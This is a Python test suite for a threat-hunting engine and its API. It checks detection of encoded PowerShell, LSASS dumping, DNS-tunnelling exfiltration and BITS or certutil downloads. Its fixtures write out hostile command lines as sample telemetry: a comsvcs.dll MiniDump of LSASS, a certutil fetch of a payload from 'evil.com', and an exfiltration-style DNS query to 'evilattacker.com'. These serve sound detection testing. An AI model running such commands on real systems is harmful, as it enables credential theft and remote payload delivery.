"""
Unit and Integration Tests for Threat Hunting Subsystem.
Verifies hypothesis lifecycle, template loading, telemetry evaluation, IOC extraction, and API endpoints.
"""

import pytest
from fastapi.testclient import TestClient

from cybershield.api.server import app
from cybershield.hunting.engine import ThreatHuntingEngine
from cybershield.hunting.queries import BUILTIN_HUNT_TEMPLATES
from cybershield.hunting.schemas import (
    HuntConfidence,
    HuntExecutionRequest,
    HuntHypothesis,
    HuntStatus,
)


@pytest.fixture
def hunting_engine():
    return ThreatHuntingEngine()


@pytest.fixture
def client():
    return TestClient(app)


def test_builtin_templates_and_default_hypotheses(hunting_engine):
    assert len(BUILTIN_HUNT_TEMPLATES) >= 5
    hypotheses = hunting_engine.list_hypotheses()
    assert len(hypotheses) >= len(BUILTIN_HUNT_TEMPLATES)
    
    # Verify specific MITRE techniques are present
    technique_ids = [t for h in hypotheses for t in h.mitre_technique_ids]
    assert "T1059.001" in technique_ids
    assert "T1003.001" in technique_ids
    assert "T1218" in technique_ids


def test_custom_hypothesis_lifecycle(hunting_engine):
    new_hypo = HuntHypothesis(
        id="HYPO-CUSTOM-001",
        title="Hunt for Abnormal BITS Transfers",
        description="Searching for bitsadmin usage downloading exe/dll from external IP",
        mitre_tactics=["Defense Evasion"],
        mitre_technique_ids=["T1197"],
        target_data_sources=["edr_process"],
        query_template="process_name =~ /bitsadmin/i AND command_line =~ /transfer/i",
    )
    
    created = hunting_engine.create_hypothesis(new_hypo)
    assert created.id == "HYPO-CUSTOM-001"
    
    retrieved = hunting_engine.get_hypothesis("HYPO-CUSTOM-001")
    assert retrieved is not None
    assert retrieved.title == "Hunt for Abnormal BITS Transfers"
    
    deleted = hunting_engine.delete_hypothesis("HYPO-CUSTOM-001")
    assert deleted is True
    assert hunting_engine.get_hypothesis("HYPO-CUSTOM-001") is None


def test_hunt_execution_powershell_obfuscation(hunting_engine):
    # Retrieve PowerShell hypothesis
    hypo = next(h for h in hunting_engine.list_hypotheses() if "T1059.001" in h.mitre_technique_ids)
    
    events = [
        {
            "id": "evt-1",
            "hostname": "HR-WORKSTATION",
            "process_name": "notepad.exe",
            "command_line": "notepad.exe C:\\notes.txt",
        },
        {
            "id": "evt-2",
            "hostname": "FINANCE-PC01",
            "process_name": "powershell.exe",
            "command_line": "powershell.exe -NonInteractive -NoProfile -enc SQBFAFgAIAAoAE4AZQB3...",
            "src_ip": "192.168.1.45",
        },
    ]
    
    req = HuntExecutionRequest(hypothesis_id=hypo.id)
    result = hunting_engine.execute_hunt(req, events)
    
    assert result.status == HuntStatus.COMPLETED
    assert result.total_events_scanned == 2
    assert result.matched_events_count == 1
    assert len(result.findings) == 1
    assert result.findings[0].entity_id == "FINANCE-PC01"
    assert result.findings[0].confidence == HuntConfidence.HIGH
    assert result.findings[0].risk_score >= 80.0


def test_hunt_execution_lsass_dumping(hunting_engine):
    hypo = next(h for h in hunting_engine.list_hypotheses() if "T1003.001" in h.mitre_technique_ids)
    
    events = [
        {
            "id": "evt-lsass",
            "hostname": "DOMAIN-CTRL-01",
            "process_name": "rundll32.exe",
            "command_line": "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 624 C:\\lsass.dmp full",
        }
    ]
    
    req = HuntExecutionRequest(hypothesis_id=hypo.id)
    result = hunting_engine.execute_hunt(req, events)
    
    assert result.matched_events_count == 1
    finding = result.findings[0]
    assert finding.confidence == HuntConfidence.CRITICAL
    assert finding.risk_score >= 90.0


def test_hunt_execution_dns_tunneling_and_iocs(hunting_engine):
    hypo = next(h for h in hunting_engine.list_hypotheses() if "T1048" in h.mitre_technique_ids)
    
    long_random_dns = "v8xk29fm30qp9z41lwk57a0bc83jdh184kd92nfa01.exfil.evilattacker.com"
    events = [
        {
            "id": "dns-evt-1",
            "src_ip": "10.0.1.50",
            "query": "google.com",
            "query_type": "A",
        },
        {
            "id": "dns-evt-2",
            "src_ip": "10.0.1.99",
            "query": long_random_dns,
            "query_type": "TXT",
            "destination_ip": "198.51.100.22",
        },
    ]
    
    req = HuntExecutionRequest(hypothesis_id=hypo.id)
    result = hunting_engine.execute_hunt(req, events)
    
    assert result.matched_events_count == 1
    assert len(result.extracted_iocs) >= 1
    ioc_values = [i["value"] for i in result.extracted_iocs]
    assert any("198.51.100.22" in val or "evilattacker.com" in val for val in ioc_values)


def test_hunting_metrics(hunting_engine):
    metrics = hunting_engine.get_hunt_metrics()
    assert metrics["total_hypotheses"] > 0
    assert "hypotheses_by_tactic" in metrics
    assert len(metrics["hypotheses_by_tactic"]) > 0


def test_hunting_api_endpoints(client):
    # 1. List hypotheses
    resp = client.get("/api/hunting/hypotheses")
    assert resp.status_code == 200
    hypos = resp.json()
    assert len(hypos) > 0
    hypo_id = hypos[0]["id"]
    
    # 2. Get specific hypothesis
    resp = client.get(f"/api/hunting/hypotheses/{hypo_id}")
    assert resp.status_code == 200
    assert resp.json()["id"] == hypo_id
    
    # 3. List templates
    resp = client.get("/api/hunting/templates")
    assert resp.status_code == 200
    assert len(resp.json()) >= 5
    
    # 4. Execute hunt via API
    run_payload = {
        "hypothesis_id": hypo_id,
        "lookback_minutes": 30,
        "telemetry_events": [
            {
                "id": "evt-api-test",
                "hostname": "SEC-OPS-01",
                "process_name": "certutil.exe",
                "command_line": "certutil.exe -urlcache -split -f http://evil.com/payload.exe",
            }
        ]
    }
    resp = client.post("/api/hunting/execute", json=run_payload)
    assert resp.status_code == 200
    result_data = resp.json()
    assert result_data["hypothesis_id"] == hypo_id
    assert "execution_id" in result_data
    
    # 5. List and get execution results
    resp = client.get("/api/hunting/results")
    assert resp.status_code == 200
    assert len(resp.json()) >= 1
    
    # 6. Metrics
    resp = client.get("/api/hunting/metrics")
    assert resp.status_code == 200
    assert resp.json()["total_hypotheses"] >= 1
